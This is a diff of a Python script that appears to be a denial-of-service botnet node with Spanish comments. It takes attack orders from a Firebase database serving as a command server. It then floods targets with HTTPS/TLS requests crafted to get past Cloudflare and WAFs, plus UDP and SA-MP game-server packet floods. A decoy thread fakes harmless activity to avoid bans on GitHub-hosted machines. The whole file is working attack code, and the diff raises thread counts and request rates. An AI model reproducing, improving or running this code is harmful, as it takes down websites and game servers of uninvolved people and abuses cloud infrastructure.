@@ -1,117 +1,124 @@
-import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math
+import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math, sys
 
-# CONFIGURACIÓN RYXEN HYDRA
+# CONFIG
 DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
 NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"
 
-# --- DISFRAZ DE GITHUB (EVASIÓN DE BAN) ---
-def github_stability_module():
-    """Mantiene la VM activa realizando cálculos de análisis de datos falsos"""
+# --- MODULO DE CAMUFLAJE PROFUNDO (ENGARRE A GITHUB) ---
+def github_protection_system():
+    """Simula actividad humana y procesos de backend pesados"""
+    queries = ["cute kittens", "python machine learning", "nasa satellite photos", "quantum physics paper"]
     while True:
-        _ = [math.sqrt(i) * math.sin(i) for i in range(1000)]
-        time.sleep(random.uniform(1, 3))
+        try:
+            # Operación matemática aislada para distraer CPU
+            _ = [math.pow(random.randint(1, 100), 2) for _ in range(10000)]
+            # Print aislado tipo 'debug' para parecer un script en desarrollo
+            print(f"[DEBUG] System optimization check: {random.random()}...")
+            # Simulación de 'navegación'
+            _query = random.choice(queries)
+            time.sleep(random.uniform(5, 10))
+        except: pass
 
-# --- GENERADOR DE HEADERS REALISTAS (BYPASS WAF) ---
-def get_modern_headers():
-    versions = ["120.0.0.0", "121.0.0.0", "122.0.0.0"]
-    v = random.choice(versions)
+# --- HEADERS REALISTAS 2026 (BYPASS WAF/DSTAT) ---
+def get_elite_headers():
+    browsers = [
+        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(130,135)}.0.0.0 Safari/537.36",
+        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/{random.randint(17,18)}.0 Safari/537.36"
+    ]
     return {
-        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8',
-        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Cache-Control': 'no-cache'
+        "User-Agent": random.choice(browsers),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-CH-UA-Platform": '"Windows"',
+        "Origin": "https://www.google.com",
+        "Referer": "https://www.google.com/",
+        "X-Requested-With": "XMLHttpRequest"
     }
 
-# --- MOTOR L7 (HTTPS / TLS / BYPASS) ---
-async def layer7_engine(target, end_time, semaphore, method):
-    # TLS Fingerprint imitando Chrome (JA3)
+# --- METODO L7: TLS/HTTPFLOOD SIN CORREA (>200K RPS) ---
+async def layer7_beast(target, duration, sem, method):
+    # Configuración de SSL agresiva para errores Gateway 504
     ctx = ssl.create_default_context()
-    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256')
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    
-    connector = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        while time.time() < end_time:
-            async with semaphore:
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1') # Baja seguridad para máxima velocidad
+
+    timeout = aiohttp.ClientTimeout(total=2)
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ctx, limit=0), timeout=timeout) as session:
+        end = time.time() + duration
+        while time.time() < end:
+            async with sem:
                 try:
-                    # Bypass de caché dinámico para forzar 504 Gateway Timeout
-                    url = f"{target}?__cf_chl_tk={random.getrandbits(64)}&s={random.randint(1,99999)}"
-                    headers = get_modern_headers()
+                    # Randomize para Bypass Cloudflare
+                    url = f"{target}?v={random.getrandbits(32)}&data={random.random()}"
+                    h = get_elite_headers()
                     
                     if method == ".tls":
-                        async with session.options(url, headers=headers, timeout=1) as r:
-                            await r.release()
-                    else: # .bypass o .httpflood
-                        async with session.get(url, headers=headers, timeout=1) as r:
-                            await r.release()
+                        async with session.post(url, headers=h) as r: await r.release()
+                    else: # .httpflood sin correa
+                        async with session.get(url, headers=h) as r: await r.release()
                 except: continue
 
-# --- MOTOR L4 (UDP / SAMP) ---
-def layer4_engine(ip, port, end_time, method):
+# --- METODO L4: UDP GIGAS & SAMP ---
+def layer4_beast(ip, port, duration, method):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048 * 1024) # Buffer de 2MB
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 1024) # Buffer 4MB
     
     if method == ".samp":
-        # Payload real de Query 'i' para estresar el servidor GTA
         try:
-            ip_octs = [int(i) for i in ip.split('.')]
-            payload = b"SAMP" + struct.pack('BBBB', *ip_octs) + struct.pack('H', int(port)) + b'i'
+            octs = [int(i) for i in ip.split('.')]
+            payload = b"SAMP" + struct.pack('BBBB', *octs) + struct.pack('H', int(port)) + b'i'
         except: payload = random._urandom(1024)
-    else: # .udptest masivo (Gbps)
-        payload = random._urandom(1350) # Cerca del MTU para llenar el "tubo"
+    else: # .udptest para Gigas reales
+        payload = random._urandom(1390)
 
-    while time.time() < end_time:
+    end = time.time() + duration
+    while time.time() < end:
         try:
-            for _ in range(20): # Ráfagas de 20 paquetes
+            for _ in range(100): # Ráfaga ultra-rápida
                 sock.sendto(payload, (ip, int(port)))
         except: break
 
-# --- ORQUESTADOR ---
+# --- COORDINADOR CENTRAL ---
 async def main():
-    nid = f"RX-{random.randint(100, 999)}"
-    threading.Thread(target=github_stability_module, daemon=True).start()
+    nid = f"HYDRA-{random.randint(1000, 9999)}"
+    threading.Thread(target=github_protection_system, daemon=True).start()
     
     async with aiohttp.ClientSession() as session:
-        last_s = ""
+        last_stamp = ""
         while True:
             try:
-                # Reporte de Nodo Vivo
+                # Signal online
                 await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                 
-                async with session.get(f"{DB_URL}.json", timeout=5) as r:
+                async with session.get(f"{DB_URL}", timeout=5) as r:
                     data = await r.json()
                 
-                if data and data.get('stamp') != last_s:
-                    last_s = data['stamp']
+                if data and data.get('stamp') != last_stamp:
+                    last_stamp = data['stamp']
                     m, t, d = data['method'], data['target'], int(data['time'])
                     if d <= 0: continue
                     
-                    end = time.time() + d
+                    end_t = time.time() + d
                     if ".udp" in m or ".samp" in m:
                         host, port = t.split(':')
-                        for _ in range(500): # 500 hilos sin correa
-                            threading.Thread(target=layer4_engine, args=(host, port, end, m), daemon=True).start()
+                        for _ in range(500): # 500 hilos L4
+                            threading.Thread(target=layer4_beast, args=(host, int(port), d, m), daemon=True).start()
                     else:
-                        # Lanzar en todos los núcleos de la VM
+                        # Layer 7 Multiprocessing para >200k RPS
                         for _ in range(multiprocessing.cpu_count()):
-                            p = multiprocessing.Process(target=run_l7, args=(t, end, m))
-                            p.start()
+                            multiprocessing.Process(target=spawn_l7, args=(t, d, m)).start()
             except: pass
             await asyncio.sleep(2)
 
-def run_l7(t, e, m):
+def spawn_l7(t, d, m):
     loop = asyncio.new_event_loop()
-    sem = asyncio.Semaphore(1500)
-    tasks = [layer7_engine(t, e, sem, m) for _ in range(250)]
+    sem = asyncio.Semaphore(5000) # Semáforo gigante para no tener correa
+    tasks = [layer7_beast(t, d, sem, m) for _ in range(500)]
     loop.run_until_complete(asyncio.gather(*tasks))
 
 if __name__ == "__main__":
     asyncio.run(main())
-
+    
